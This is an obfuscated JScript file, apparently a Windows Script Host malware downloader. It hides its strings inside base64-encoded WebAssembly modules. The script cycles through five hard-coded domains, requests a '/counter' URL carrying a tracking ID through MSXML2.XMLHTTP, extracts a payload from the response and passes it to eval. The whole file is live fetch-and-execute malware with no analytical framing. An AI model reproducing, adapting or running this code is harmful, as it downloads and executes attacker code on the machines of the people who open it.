const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __ifWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAF/AAKfgICAAAIDZW52CGltcEZ1bmMxAAADZW52CGltcEZ1bmMyAAADgoCAgAABAQSEgICAAAFwAAAFg4CAgAABAAEHkYCAgAACBm1lbW9yeQIABGRhdGEAAgqSgICAAAGMgICAAAAgAARAEAAFEAELCw==';
const __ifWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__ifWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__ifWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGi4GAgAAZfwBBAQt/AEESC38AQRgLfwBBHAt/AEEeC38AQSQLfwBBKAt/AEEsC38AQTALfwBBNAt/AEE4C38AQToLfwBBwAALfwBByAALfwBB1AALfwBB6gALfwBBgAELfwBBnAELfwBBrAELfwBBrgILfwBBtAILfwBBtgILfwBBwgILfwBByAILfwBBygILB+GBgIAAGgZtZW1vcnkCAAVkYXRhMAMABWRhdGExAwEFZGF0YTIDAgVkYXRhMwMDBWRhdGE0AwQFZGF0YTUDBQVkYXRhNgMGBWRhdGE3AwcFZGF0YTgDCAVkYXRhOQMJBmRhdGExMAMKBmRhdGExMQMLBmRhdGExMgMMBmRhdGExMwMNBmRhdGExNAMOBmRhdGExNQMPBmRhdGExNgMQBmRhdGExNwMRBmRhdGExOAMSBmRhdGExOQMTBmRhdGEyMAMUBmRhdGEyMQMVBmRhdGEyMgMWBmRhdGEyMwMXBmRhdGEyNAMYC7GDgIAAGQBBAQsPTVNYTUwyLlhNTEhUVFAAAEESCwQlMkYAAEEYCwJ0AABBHAsBAABBHgsEJTNBAABBJAsCcAAAQSgLAmgAAEEsCwJTAABBMAsCYQAAQTQLAlQAAEE4CwEAAEE6CwVHRVRBAABBwAALBmh0dHBSAABByAALCjNvdXRzLmNvbQAAQdQACxRhc2lzbWFycmF0eGluZXQuY29tAABB6gALFGF1c3RpbnNob3J0dGVybS5jb20AAEGAAQsaZ3JhcGhpY2Rlc2lnbmRlbnZlcmNvLmNvbQAAQZwBCw5iZXR0eWp1ZHkuY29tAABBrAELgQEwMDAwMDAxSm5DdHpyRHVaQ3pFdFRncDR4Um5pa3ZzcXk2VTJyVHFGeldzRTlwWFFobDNvWE0yRWJiTjdHYmk0NTVidHhFeUV1WWwyS1k3em1kSTg0X2o0UWFGc0tRcU1ZNFNhYXVIUWpaX1BIZWlYZE1nTVdpZFRiY05BQ1RVMAAAQa4CCwQlMkYAAEG0AgsBAABBtgILCyUyRmNvdW50ZXIAAEHCAgsEJTNGAABByAILAQAAQcoCCwVldmFsAA=='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var pol = WScript.CreateObject(lS(0, 0));
var jamie = [
    lS(0, 1),
    lS(0, 2),
    lS(0, 3),
    lS(0, 4),
    lS(0, 5),
    lS(0, 6),
    lS(0, 7),
    lS(0, 8),
    lS(0, 9),
    lS(0, 10)
];
jamie[1 + 1] = lS(0, 11);
jamie[2] = jamie[2].substr(0, 3);
var zaher = lS(0, 12);
zaher = zaher.substr(0, 4);
var x = [
    lS(0, 13),
    lS(0, 14),
    lS(0, 15),
    lS(0, 16),
    lS(0, 17)
];
var m = lS(0, 18);
var gyt = 0;
var lub = lS(0, 19);
while (true) {
    if (gyt >= x.length) {
        break;
    }
    try {
        var ghyt = false;
        var tjkh = x[gyt + 0];
        (() => {
            const __callInstance2 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        pol.open(jamie[1 + 1], zaher + jamie[3] + lub + lS(0, 20) + lub + tjkh + lS(0, 21) + lS(0, 22) + m, ghyt);
                    }
                }
            });
            const __exports = __callInstance2.exports;
            return __exports.data();
        })();
        (() => {
            const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        pol.send();
                    }
                }
            });
            const __exports = __callInstance1.exports;
            return __exports.data();
        })();
        var r = pol.responseText;
        var rima = 500;
        var got = 50 + 450 + rima;
        if (r.length - got > 6 - 6 && r.indexOf(m) > got + 1 - 1002) {
            var amel = muhter(r, m);
            var jimmk = amel.join(jamie[7] + lS(0, 23));
            (() => {
                const __ifInstance0 = new WebAssembly.Instance(__ifWasmModule, {
                    env: {
                        impFunc1: () => {
                            {
                                (() => {
                                    const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
                                        env: {
                                            impFunc: () => {
                                                ataaa(jamie[9] + jimmk + jamie[9]);
                                            }
                                        }
                                    });
                                    const __exports = __callInstance0.exports;
                                    return __exports.data();
                                })();
                            }
                        },
                        impFunc2: () => {
                        }
                    }
                });
                const __exports = __ifInstance0.exports;
                return __exports.data(1 == 1 ? 1 : 0);
            })();
            break;
        }
        ;
    } catch (e) {
    }
    ;
    gyt++;
}
;
function ataaa(ziyter) {
    window[lS(0, 24, true)](ziyter);
}
function muhter(kjg, lki) {
    return kjg.split(lki);
}